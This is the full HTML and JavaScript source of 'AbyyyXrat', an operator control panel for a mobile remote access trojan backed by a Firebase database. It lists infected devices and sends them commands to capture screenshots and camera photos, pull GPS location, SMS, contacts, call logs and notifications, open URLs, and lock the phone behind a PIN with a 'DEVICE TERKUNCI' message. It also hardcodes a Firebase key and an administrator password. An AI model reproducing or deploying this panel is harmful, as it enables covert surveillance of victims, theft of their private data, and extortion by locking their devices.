<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>AbyyyXrat CONTROL</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,sans-serif;}
        html,body{background:#050510;min-height:100vh;height:100%;overflow:hidden;}
        .container{width:100%;max-width:100%;height:100vh;display:flex;flex-direction:column;}
        
        .login-wrap{display:flex;align-items:center;justify-content:center;height:100%;padding:16px;}
        .login-box{background:rgba(12,14,26,0.9);border-radius:28px;padding:36px 26px;border:1px solid rgba(139,92,246,0.25);text-align:center;width:100%;max-width:370px;backdrop-filter:blur(20px);animation:popIn 0.5s ease;}
        @keyframes popIn{from{opacity:0;transform:scale(0.9) translateY(20px);}to{opacity:1;transform:scale(1) translateY(0);}}
        .hex-logo{width:60px;height:60px;margin:0 auto 12px;background:linear-gradient(135deg,#8b5cf6,#06b6d4);clip-path:polygon(50% 0%,100% 25%,100% 75%,50% 100%,0% 75%,0% 25%);display:flex;align-items:center;justify-content:center;font-size:24px;color:#fff;font-weight:900;animation:hexPulse 3s ease-in-out infinite;}
        @keyframes hexPulse{0%,100%{box-shadow:0 0 20px rgba(139,92,246,0.3);}50%{box-shadow:0 0 50px rgba(139,92,246,0.6),0 0 80px rgba(6,182,212,0.4);}}
        .login-box h1{font-size:24px;font-weight:900;color:#fff;letter-spacing:3px;margin-bottom:2px;}
        .login-box h1 span{background:linear-gradient(135deg,#06b6d4,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
        .login-box .sub{color:#6b7280;font-size:10px;letter-spacing:3px;margin-bottom:22px;}
        .login-box input{width:100%;padding:13px 15px;background:rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.08);border-radius:12px;color:#fff;font-size:14px;margin-bottom:9px;outline:none;transition:0.3s;}
        .login-box input:focus{border-color:#8b5cf6;box-shadow:0 0 15px rgba(139,92,246,0.2);}
        .login-box input::placeholder{color:#4a5568;}
        .login-box button{width:100%;padding:14px;background:linear-gradient(135deg,#8b5cf6,#06b6d4);border:none;border-radius:12px;color:#fff;font-size:15px;font-weight:700;cursor:pointer;letter-spacing:2px;transition:0.3s;}
        .login-box button:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(139,92,246,0.4);}
        .login-error{color:#ef4444;font-size:11px;margin-top:8px;min-height:16px;}
        .hidden{display:none!important;}
        
        .panel{height:100%;display:flex;flex-direction:column;padding:10px 12px;background:rgba(8,10,20,0.95);animation:fadeIn 0.4s ease;}
        @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
        .top-row{display:flex;align-items:center;gap:10px;padding:8px 0 10px;border-bottom:1px solid rgba(255,255,255,0.05);flex-shrink:0;}
        .avt{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,#8b5cf6,#06b6d4);display:flex;align-items:center;justify-content:center;font-size:15px;color:#fff;font-weight:700;}
        .top-info{flex:1;}
        .top-info .name{color:#fff;font-size:13px;font-weight:600;}
        .top-info .role{color:#6b7280;font-size:9px;letter-spacing:1px;}
        .exit-btn{background:transparent;border:1px solid rgba(255,255,255,0.1);color:#9ca3af;padding:5px 12px;border-radius:16px;cursor:pointer;font-size:9px;letter-spacing:1px;transition:0.3s;}
        .exit-btn:hover{border-color:#ef4444;color:#ef4444;}
        
        .stats{display:flex;gap:6px;margin:8px 0;flex-shrink:0;}
        .stat{flex:1;background:rgba(255,255,255,0.02);border-radius:10px;padding:10px 6px;text-align:center;border:1px solid rgba(255,255,255,0.04);}
        .stat .n{font-size:18px;font-weight:700;color:#06b6d4;}
        .stat .l{font-size:8px;color:#6b7280;letter-spacing:1px;text-transform:uppercase;}
        .stat .n.g{color:#10b981;}.stat .n.r{color:#ef4444;}
        
        .search{width:100%;padding:9px 12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;color:#fff;font-size:11px;margin-bottom:6px;outline:none;flex-shrink:0;}
        .search:focus{border-color:#8b5cf6;}
        
        .content{flex:1;overflow-y:auto;min-height:0;}
        .dev-card{display:flex;justify-content:space-between;align-items:center;padding:11px 13px;background:rgba(255,255,255,0.02);border-radius:10px;margin-bottom:4px;border:1px solid rgba(255,255,255,0.04);cursor:pointer;transition:0.2s;}
        .dev-card:hover{border-color:#8b5cf6;}
        .dev-card.selected{border-color:#06b6d4;background:rgba(139,92,246,0.05);}
        .dev-card .dn{color:#fff;font-size:12px;font-weight:500;}
        .dev-card .di{color:#6b7280;font-size:9px;margin-top:1px;}
        .dev-card .ds{font-size:8px;font-weight:600;padding:3px 10px;border-radius:14px;}
        .dev-card .ds.on{color:#10b981;background:rgba(16,185,129,0.1);}
        .dev-card .ds.off{color:#ef4444;background:rgba(239,68,68,0.1);}
        .empty{text-align:center;padding:30px;color:#4a5568;font-size:12px;}
        
        .bot-nav{display:flex;gap:4px;padding-top:8px;border-top:1px solid rgba(255,255,255,0.05);flex-shrink:0;}
        .bot-nav button{flex:1;padding:9px;background:transparent;border:1px solid rgba(255,255,255,0.05);color:#6b7280;border-radius:8px;cursor:pointer;font-size:10px;font-weight:600;letter-spacing:1px;transition:0.3s;}
        .bot-nav button.active{background:#8b5cf6;color:#fff;border-color:#8b5cf6;box-shadow:0 4px 15px rgba(139,92,246,0.3);}
        
        .ctrl-panel{display:none;height:100%;overflow-y:auto;}
        .ctrl-panel.active{display:block;animation:fadeIn 0.3s ease;}
        .back-btn{background:transparent;border:1px solid rgba(255,255,255,0.1);color:#9ca3af;padding:4px 12px;border-radius:14px;cursor:pointer;font-size:9px;margin-bottom:6px;display:inline-block;}
        .dev-bar{background:rgba(255,255,255,0.02);padding:10px 13px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;}
        .dev-bar .dn{color:#fff;font-size:12px;font-weight:600;}
        .dev-bar .ds{font-size:9px;font-weight:600;padding:3px 10px;border-radius:14px;}
        .dev-bar .ds.on{color:#10b981;background:rgba(16,185,129,0.1);}
        .dev-bar .ds.off{color:#ef4444;background:rgba(239,68,68,0.1);}
        .cmd-grid{display:grid;grid-template-columns:1fr 1fr;gap:5px;}
        .cmd-btn{padding:10px;border:none;border-radius:8px;font-size:10px;font-weight:700;cursor:pointer;letter-spacing:0.5px;transition:0.2s;text-transform:uppercase;}
        .cmd-btn:hover{transform:translateY(-1px);}
        .cmd-btn:active{transform:scale(0.96);}
        .btn-c{background:#06b6d4;color:#000;}
        .btn-d{background:#ef4444;color:#fff;}
        .btn-w{background:#f59e0b;color:#000;}
        .btn-p{background:#8b5cf6;color:#fff;}
        .btn-fw{grid-column:1/-1;}
        .lock-inp{width:100%;padding:8px;background:rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.08);border-radius:6px;color:#06b6d4;margin:5px 0;font-size:10px;outline:none;}
        .res-area{margin-top:8px;}
        .res-area img{width:100%;border-radius:8px;margin-top:5px;border:1px solid rgba(255,255,255,0.06);}
        .res-txt{background:rgba(0,0,0,0.4);padding:8px;border-radius:8px;color:#06b6d4;font-size:9px;margin-top:4px;max-height:150px;overflow-y:auto;white-space:pre-wrap;font-family:monospace;}
        
        .prof-panel{display:none;height:100%;overflow-y:auto;}
        .prof-panel.active{display:block;animation:fadeIn 0.3s ease;}
        .prof-card{background:rgba(255,255,255,0.02);padding:18px;border-radius:14px;border:1px solid rgba(255,255,255,0.04);text-align:center;}
        .big-avt{width:60px;height:60px;border-radius:50%;background:linear-gradient(135deg,#8b5cf6,#06b6d4);display:flex;align-items:center;justify-content:center;font-size:24px;color:#fff;font-weight:700;margin:0 auto 8px;}
        .prof-card .pn{color:#fff;font-size:14px;font-weight:600;}
        .prof-card .pr{color:#6b7280;font-size:10px;}
        .uid-box{margin-top:10px;padding:12px;background:rgba(0,0,0,0.3);border-radius:8px;border:1px solid rgba(255,255,255,0.05);}
        .uid-box .lbl{color:#6b7280;font-size:9px;letter-spacing:1px;}
        .uid-box .uid{color:#06b6d4;font-size:11px;margin-top:3px;word-break:break-all;font-family:monospace;}
        .uid-box .rfrsh{margin-top:4px;padding:4px 14px;background:transparent;border:1px solid rgba(255,255,255,0.1);color:#9ca3af;border-radius:14px;cursor:pointer;font-size:9px;}
        .prof-card .pw-btn{margin-top:8px;padding:9px;background:transparent;border:1px solid rgba(255,255,255,0.08);color:#9ca3af;border-radius:8px;cursor:pointer;font-size:10px;width:100%;}
        
        .toast{position:fixed;top:14px;left:50%;transform:translateX(-50%);padding:9px 18px;border-radius:20px;z-index:999;display:none;font-weight:600;font-size:10px;color:#fff;letter-spacing:0.5px;}
        @keyframes toastIn{from{opacity:0;transform:translateX(-50%) translateY(-10px);}to{opacity:1;transform:translateX(-50%) translateY(0);}}
    </style>
</head>
<body>

<div class="toast" id="toast"></div>

<div class="container" id="app">
    <div class="login-wrap" id="loginSection">
        <div class="login-box">
            <div class="hex-logo">X</div>
            <h1>Abyyy<span>X</span>rat</h1>
            <p class="sub">Remote Control System</p>
            <input type="text" id="loginUser" placeholder="Username" autocomplete="off">
            <input type="password" id="loginPass" placeholder="Password" autocomplete="off">
            <button onclick="login()">Access Panel</button>
            <div class="login-error" id="loginError"></div>
        </div>
    </div>

    <div id="panelSection" class="hidden" style="height:100%;display:flex;flex-direction:column;">
        <div class="panel">
            <div class="top-row">
                <div class="avt" id="userAvatar">A</div>
                <div class="top-info"><div class="name" id="userName">-</div><div class="role" id="userRole">-</div></div>
                <button class="exit-btn" onclick="logout()">EXIT</button>
            </div>
            <div class="stats">
                <div class="stat"><div class="n" id="totalDevices">0</div><div class="l">Total</div></div>
                <div class="stat"><div class="n g" id="onlineDevices">0</div><div class="l">Online</div></div>
                <div class="stat"><div class="n r" id="offlineDevices">0</div><div class="l">Offline</div></div>
            </div>
            <input class="search" id="searchInput" placeholder="Search device..." oninput="renderDevices()">
            <div class="content" id="mainContent">
                <div id="homeView" style="height:100%;"><div id="deviceList"><div class="empty">No Devices Connected</div></div></div>
                <div id="controlView" class="ctrl-panel">
                    <span class="back-btn" onclick="backToHome()">← BACK</span>
                    <div class="dev-bar"><div class="dn" id="ctrlDevName">-</div><div class="ds on" id="ctrlDevStatus">-</div></div>
                    <div class="cmd-grid" id="commandGrid"></div>
                    <input type="text" id="lockPin" class="lock-inp" placeholder="Lock PIN (6 digit)" value="123456">
                    <input type="text" id="lockMsg" class="lock-inp" placeholder="Lock message" value="DEVICE TERKUNCI">
                    <div class="res-area" id="resultArea"></div>
                </div>
                <div id="profileView" class="prof-panel">
                    <div class="prof-card">
                        <div class="big-avt" id="profAvatar">A</div>
                        <div class="pn" id="profName">-</div>
                        <div class="pr" id="profRole">-</div>
                        <div class="uid-box">
                            <div class="lbl">YOUR UID</div>
                            <div class="uid" id="profUid">-</div>
                            <button class="rfrsh" onclick="generateUid()">GENERATE NEW</button>
                        </div>
                        <button class="pw-btn" onclick="changePwPrompt()">CHANGE PASSWORD</button>
                    </div>
                </div>
            </div>
            <div class="bot-nav">
                <button class="active" onclick="showTab('home')">HOME</button>
                <button onclick="showTab('profile')">PROFILE</button>
            </div>
        </div>
    </div>
</div>

<script>
var fc={apiKey:"AIzaSyAr9W4sxpLZYvlm545GWO0MNcQmr67cdRc",authDomain:"abyyyxrat-firebase.firebaseapp.com",databaseURL:"https://abyyyxrat-firebase-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"abyyyxrat-firebase",storageBucket:"abyyyxrat-firebase.firebasestorage.app",messagingSenderId:"194291275709",appId:"1:194291275709:web:92f1aae3884d834ceea4d4"};
firebase.initializeApp(fc);var db=firebase.database();
var curUser=null,curRole=null,curUid=null,selDev=null,allDevs=[],resListener=null;

function toast(m,c){var t=document.getElementById('toast');t.textContent=m;t.style.display='block';t.style.background=c||'#8b5cf6';t.style.animation='toastIn 0.3s ease';setTimeout(function(){t.style.display='none';},1800);}

(function(){db.ref('users').once('value').then(function(s){var f=false;s.forEach(function(c){if(c.val().username==='Abyyy'&&c.val().role==='DEVELOPER')f=true;});if(!f){db.ref('users/UID_DEV').set({username:'Abyyy',password:'asdfghjkl',role:'DEVELOPER',createdBy:'system',createdAt:Date.now()}).then(function(){console.log('Dev ready');});}})})();

function login(){
    var u=document.getElementById('loginUser').value.trim(),p=document.getElementById('loginPass').value.trim();
    if(!u||!p){document.getElementById('loginError').innerText='Fill all fields!';return;}
    db.ref('users').orderByChild('username').equalTo(u).once('value').then(function(s){
        if(s.exists()){var id,d;s.forEach(function(c){id=c.key;d=c.val();});if(d.password===p){curUser=u;curRole=d.role||'MEMBER';showPanel();}else document.getElementById('loginError').innerText='Wrong password!';}
        else document.getElementById('loginError').innerText='User not found!';
    });
}

function showPanel(){
    document.getElementById('loginSection').style.display='none';document.getElementById('panelSection').classList.remove('hidden');
    document.getElementById('userName').textContent=curUser;document.getElementById('userRole').textContent=curRole;
    document.getElementById('userAvatar').textContent=curUser.charAt(0).toUpperCase();
    document.getElementById('profAvatar').textContent=curUser.charAt(0).toUpperCase();
    document.getElementById('profName').textContent=curUser;document.getElementById('profRole').textContent=curRole;
    db.ref('uids/'+curUser).once('value').then(function(s){if(s.exists())curUid=s.val().uid;else{curUid='UID_'+Date.now().toString(36);db.ref('uids/'+curUser).set({uid:curUid});}document.getElementById('profUid').textContent=curUid;listenDevices();});
    renderCommands();showTab('home');
}

function logout(){curUser=null;curRole=null;selDev=null;if(resListener)db.ref('results').off('value',resListener);document.getElementById('panelSection').classList.add('hidden');document.getElementById('loginSection').style.display='flex';document.getElementById('loginUser').value='';document.getElementById('loginPass').value='';}

function showTab(t){
    document.querySelectorAll('.bot-nav button').forEach(function(b,i){b.classList.toggle('active',(t==='home'&&i===0)||(t==='profile'&&i===1));});
    document.getElementById('homeView').style.display=t==='home'?'block':'none';
    document.getElementById('controlView').classList.toggle('active',false);document.getElementById('controlView').style.display='none';
    document.getElementById('profileView').classList.toggle('active',t==='profile');document.getElementById('profileView').style.display=t==='profile'?'block':'none';
    document.querySelector('.search').style.display=t==='home'?'block':'none';
    document.querySelector('.stats').style.display=t==='home'?'flex':'none';
}

function listenDevices(){
    db.ref('devices').off();db.ref('devices').on('value',function(s){
        allDevs=[];if(s.exists())s.forEach(function(c){var d=c.val();if(d.uid===curUid)allDevs.push({id:c.key,uid:d.uid,online:d.online,info:d.info||{},code:d.code||'?'});});
        document.getElementById('totalDevices').textContent=allDevs.length;
        document.getElementById('onlineDevices').textContent=allDevs.filter(function(d){return d.online;}).length;
        document.getElementById('offlineDevices').textContent=allDevs.filter(function(d){return!d.online;}).length;
        renderDevices();
    });
}

function renderDevices(){
    var s=document.getElementById('searchInput').value.toLowerCase(),f=allDevs;
    if(s)f=f.filter(function(d){return d.id.toLowerCase().indexOf(s)!==-1;});
    var c=document.getElementById('deviceList');
    if(f.length===0){c.innerHTML='<div class="empty">No Devices Connected</div>';return;}
    c.innerHTML=f.map(function(d){return'<div class="dev-card'+(selDev===d.id?' selected':'')+'" onclick="selectDevice(\''+d.id+'\')"><div><div class="dn">'+d.id.substring(0,10)+'... | '+d.code+'</div><div class="di">Batt: '+(d.info.batt||'?')+' | Net: '+(d.info.connectionType||'?')+' | '+ (d.info.plat||'?')+'</div></div><div class="ds '+(d.online?'on':'off')+'">'+(d.online?'ONLINE':'OFFLINE')+'</div></div>';}).join('');
}

function selectDevice(id){
    selDev=id;var d=allDevs.find(function(x){return x.id===id;});
    if(d){document.getElementById('ctrlDevName').textContent=d.id.substring(0,14)+'... | '+d.code;var s=document.getElementById('ctrlDevStatus');s.textContent=d.online?'ONLINE':'OFFLINE';s.className='ds '+(d.online?'on':'off');}
    document.getElementById('homeView').style.display='none';document.getElementById('controlView').style.display='block';document.getElementById('controlView').classList.add('active');
    document.querySelector('.search').style.display='none';document.querySelector('.stats').style.display='none';
    document.querySelectorAll('.bot-nav button').forEach(function(b){b.classList.remove('active');});
    listenResults();toast('Selected: '+id.substring(0,10)+'...','#06b6d4');
}

function backToHome(){document.getElementById('controlView').classList.remove('active');document.getElementById('controlView').style.display='none';if(resListener)db.ref('results').off('value',resListener);showTab('home');}

function renderCommands(){
    var cmds=[
        {l:'Flash ON',c:'flashlight_on',cl:'btn-c'},{l:'Flash OFF',c:'flashlight_off',cl:'btn-c'},
        {l:'Lock',c:'lock_device',cl:'btn-d'},{l:'Unlock',c:'unlock_device',cl:'btn-p'},
        {l:'Screenshot',c:'screenshot',cl:'btn-p',fw:true},{l:'Front Cam',c:'cam_front',cl:'btn-c'},
        {l:'Back Cam',c:'cam_back',cl:'btn-c'},{l:'Vibrate',c:'vibrate',cl:'btn-w',fw:true},
        {l:'Device Info',c:'get_info',cl:'btn-p',fw:true},{l:'GPS',c:'get_location',cl:'btn-w',fw:true},
        {l:'Battery',c:'get_battery',cl:'btn-w',fw:true},{l:'Storage',c:'get_storage',cl:'btn-p',fw:true},
        {l:'Open URL',c:'open_web',cl:'btn-c',fw:true},{l:'Notifications',c:'get_notifications',cl:'btn-w',fw:true},
        {l:'SMS',c:'get_sms',cl:'btn-p',fw:true},{l:'Contacts',c:'get_contacts',cl:'btn-c',fw:true},
        {l:'Call Log',c:'get_call_log',cl:'btn-w',fw:true}
    ];
    document.getElementById('commandGrid').innerHTML=cmds.map(function(c){return'<button class="cmd-btn '+c.cl+(c.fw?' btn-fw':'')+'" onclick="sendCmd(\''+c.c+'\')">'+c.l+'</button>';}).join('');
}

function sendCmd(cmd){
    if(!selDev){toast('Select device!','#ef4444');return;}
    var p={command:cmd,from:curUser,timestamp:Date.now()};
    if(cmd==='lock_device'){p.lockMessage=document.getElementById('lockPin').value||'123456';}
    if(cmd==='open_web'){var u=prompt('URL:','https://');if(u)p.url=u;else return;}
    db.ref('commands/'+selDev).push(p).then(function(){toast('Sent: '+cmd,'#10b981');});
}

function listenResults(){
    if(resListener)db.ref('results').off('value',resListener);
    resListener=db.ref('results').on('value',function(s){
        var a=document.getElementById('resultArea');if(!s.exists()){a.innerHTML='<div class="res-txt">No results</div>';return;}
        var r=[];s.forEach(function(c){var d=c.val();if(d.target===selDev)r.push(d);});
        r.sort(function(a,b){return(b.timestamp||0)-(a.timestamp||0);});
        var h='';r.slice(0,20).forEach(function(d){
            var t=new Date(d.timestamp).toLocaleTimeString();
            if((d.type==='screenshot'||d.type==='cam_front'||d.type==='cam_back')&&d.data&&d.data.indexOf('data:image')===0){
                h+='<div style="margin-top:6px;"><b style="color:#fff;font-size:9px;">['+t+'] '+d.type+'</b><img src="'+d.data+'" style="width:100%;border-radius:6px;border:1px solid rgba(255,255,255,0.06);"></div>';
            }else{h+='<div style="color:#06b6d4;font-size:9px;margin-top:2px;">['+t+'] '+d.type+': '+(d.data||'OK')+'</div>';}
        });
        a.innerHTML=h||'<div class="res-txt">Waiting...</div>';
    });
}

function generateUid(){curUid='UID_'+Date.now().toString(36);document.getElementById('profUid').textContent=curUid;db.ref('uids/'+curUser).set({uid:curUid,updatedAt:Date.now()}).then(function(){listenDevices();toast('New UID!','#10b981');});}
function changePwPrompt(){var np=prompt('New password (min 6):');if(np&&np.length>=6){db.ref('users').orderByChild('username').equalTo(curUser).once('value').then(function(s){var id;s.forEach(function(c){id=c.key;});db.ref('users/'+id+'/password').set(np).then(function(){toast('Password changed!','#10b981');});});}else if(np)toast('Min 6 chars!','#ef4444');}

document.getElementById('loginPass').addEventListener('keypress',function(e){if(e.key==='Enter')login();});
</script>
</body>
</html>
